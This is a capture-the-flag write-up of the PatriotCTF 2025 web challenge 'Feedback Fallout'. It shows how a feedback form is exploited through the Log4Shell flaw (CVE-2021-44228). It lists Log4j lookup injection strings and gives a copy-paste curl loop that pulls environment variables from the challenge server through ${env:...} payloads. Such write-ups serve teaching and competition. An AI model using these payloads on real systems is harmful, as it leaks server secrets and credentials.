# PatriotCTF 2025 – Web Challenges Writeups
**Challenge 3: Feedback Fallout**  
**Author:** [Syndro/Ayco]  
**Category:** Web  

---

<img width="492" height="430" alt="image" src="https://github.com/user-attachments/assets/81a61722-71a8-417f-8c3d-4f0635109c69" />

---
### -1 The feedback!

<img width="1918" height="989" alt="image" src="https://github.com/user-attachments/assets/b8d412d8-1c01-42d0-bc05-eff148bf4d22" />
The moment we enter the site, We see a feedback text area, I inspected the Source, <br>
- No info on the source. <br>
- Network tab developer tools, No info. <br>

---

### -2 The vulnerability

With no where else to look, i intercepted the request using ZAP.

<img width="1315" height="555" alt="image" src="https://github.com/user-attachments/assets/ceb22927-44ac-4f77-9621-cc402f2cd663" />
<img width="799" height="96" alt="image" src="https://github.com/user-attachments/assets/6de0d39c-c4c4-4ba6-bd6a-4359cd074ec5" />

And in the ZAP intercept request, We see that Our feedback is getting read directly in the logs. <br>

So i did some research on Java And logs, And i came across a known vulnerability in Old Java versions,
<pre>(CVE-2021-44228)</pre>
This vulnerability causes us to have RCE ( Remote code execution ) Through logs, And this is what we need! <br>
So, Lets confirm our suspicions and try something basic, I Tried ${java:version}, And voila we get the java version back, AKA, It is vulnerable. <br>
<img width="1884" height="1027" alt="image" src="https://github.com/user-attachments/assets/47f8d08b-e228-49f0-af15-cb69412853b8" />
So, After Alot of tries to set up a Reverse shell using JNDI, I couldnt make it work, So it probably suggests that this version had JNDI Already disabled. So it hought, what if i just try random env keys? ${env:KEY}

<pre>
  Common syntaxes:
- ${sys:os.name}
- ${sys:user.name}
- ${log4j:configParentLocation}
- ${ENV:PATH}
- ${ENV:HOSTNAME}
- ${java:version}
</pre>

---

### -3 The flag!
So i made this simple for loop with some common names.

<pre> for i in <br>
  Admin admin ADMIN user USER User Owner Root root PCTF pctf MASONC masonc Pctf pCTF FLAG FLAG_CTF CTF SECRET FLAG KEY SECRET_FLAG FLAGS FLAGO flag secret secret_flag FLAG_SECRET secret_flag FLAG_SECRET secret_FLAG FLAG_SECRET; <br>
  do echo "Trying \${env:$i}"; <br>
  curl -s -X POST http://18.212.136.134:8080/feedback -H "X-Requested-With: XMLHttpRequest" -H "Content-Type:application/x-www-form-urlencoded;charset=UTF-8" -d "feedback=\${env:$i}" | grep -o "User .*"; done </pre>

<img width="550" height="517" alt="image" src="https://github.com/user-attachments/assets/25021d73-134d-4c96-95f2-6ea222abfca7" />

And there it is!, The flag!

Here is the payload in 1 line if u want to copy paste it. 
<pre>for i in   Admin admin ADMIN user USER User Owner Root root PCTF pctf MASONC masonc Pctf pCTF FLAG FLAG_CTF CTF SECRET FLAG KEY SECRET_FLAG FLAGS FLAGO flag secret secret_flag FLAG_SECRET secret_flag FLAG_SECRET secret_FLAG FLAG_SECRET; do echo "Trying \${env:$i}"; curl -s -X POST http://18.212.136.134:8080/feedback -H "X-Requested-With: XMLHttpRequest" -H "Content-Type:application/x-www-form-urlencoded;charset=UTF-8" -d "feedback=\${env:$i}" | grep -o "User .*"; done</pre>
